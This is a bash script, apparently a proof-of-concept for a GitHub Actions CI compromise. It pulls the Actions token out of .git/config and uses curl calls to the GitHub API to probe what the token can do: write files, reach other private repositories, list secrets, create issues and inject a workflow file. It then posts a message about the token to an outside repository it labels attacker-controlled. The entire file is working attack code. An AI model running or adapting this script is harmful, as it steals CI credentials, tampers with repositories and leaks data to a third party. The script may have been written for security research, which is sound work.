#!/usr/bin/env bash
echo "=== BLAST-SURFACE-ENUM repo=$GITHUB_REPOSITORY run=$GITHUB_RUN_ID ==="
RAW=$(sed -n "s/.*AUTHORIZATION: basic \([A-Za-z0-9+/=]*\).*/\1/p" .git/config | head -1)
TOK=$(printf "%s" "$RAW" | base64 -d | sed "s/^[^:]*://")
echo "TOKEN_KIND=$(printf "%s" "$TOK" | cut -c1-4) TOKEN_LEN=${#TOK}"
H="Authorization: Bearer $TOK"
A="Accept: application/vnd.github+json"

echo "PERM_own_repo_read=$(curl -s -o /dev/null -w '%{http_code}' -H "$H" -H "$A" https://api.github.com/repos/$GITHUB_REPOSITORY)"

B=$(printf "exfil-write-proof" | base64)
echo "PERM_own_repo_write=$(curl -s -o /dev/null -w '%{http_code}' -X PUT -H "$H" -H "$A" -d "{\"message\":\"exfil write proof\",\"content\":\"$B\"}" https://api.github.com/repos/$GITHUB_REPOSITORY/contents/EXFIL_WRITE_PROOF.txt)"

echo "PERM_other_private_read=$(curl -s -o /dev/null -w '%{http_code}' -H "$H" -H "$A" https://api.github.com/repos/0nicho/vic-private)"
echo "PERM_other_private_read2=$(curl -s -o /dev/null -w '%{http_code}' -H "$H" -H "$A" https://api.github.com/repos/0nicho/vic-plant)"
echo "PERM_secrets_list=$(curl -s -o /dev/null -w '%{http_code}' -H "$H" -H "$A" https://api.github.com/repos/$GITHUB_REPOSITORY/actions/secrets)"
echo "PERM_variables_list=$(curl -s -o /dev/null -w '%{http_code}' -H "$H" -H "$A" https://api.github.com/repos/$GITHUB_REPOSITORY/actions/variables)"
echo "PERM_issue_create=$(curl -s -o /dev/null -w '%{http_code}' -X POST -H "$H" -H "$A" -d '{"title":"exfil-proof-issue","body":"created by attacker code using the stolen token"}' https://api.github.com/repos/$GITHUB_REPOSITORY/issues)"
echo "PERM_workflow_write=$(curl -s -o /dev/null -w '%{http_code}' -X PUT -H "$H" -H "$A" -d "{\"message\":\"wf\",\"content\":\"$B\"}" https://api.github.com/repos/$GITHUB_REPOSITORY/contents/.github/workflows/injected.yml)"
echo "PERM_user_api=$(curl -s -o /dev/null -w '%{http_code}' -H "$H" -H "$A" https://api.github.com/user)"

echo "--- repos this token can enumerate ---"
curl -s -o /tmp/rl.json -w "PERM_installation_repos=%{http_code}\n" -H "$H" -H "$A" "https://api.github.com/installation/repositories?per_page=100"
grep -o "\"full_name\":\"[^\"]*\"" /tmp/rl.json | head -20 | sed "s/^/  VISIBLE_/"
grep -c "\"full_name\"" /tmp/rl.json | sed "s/^/  VISIBLE_COUNT=/"

echo "--- EGRESS to attacker-controlled repo ---"
echo "PERM_egress_attacker_repo=$(curl -s -o /dev/null -w '%{http_code}' -X POST -H "$H" -H "$A" -d "{\"body\":\"EXFIL-EGRESS-PROOF kind=$(printf '%s' "$TOK" | cut -c1-4) len=${#TOK} from=$GITHUB_REPOSITORY run=$GITHUB_RUN_ID\"}" https://api.github.com/repos/nichoc0/atk-build-step/issues/1/comments)"
echo "=== ENUM COMPLETE ==="
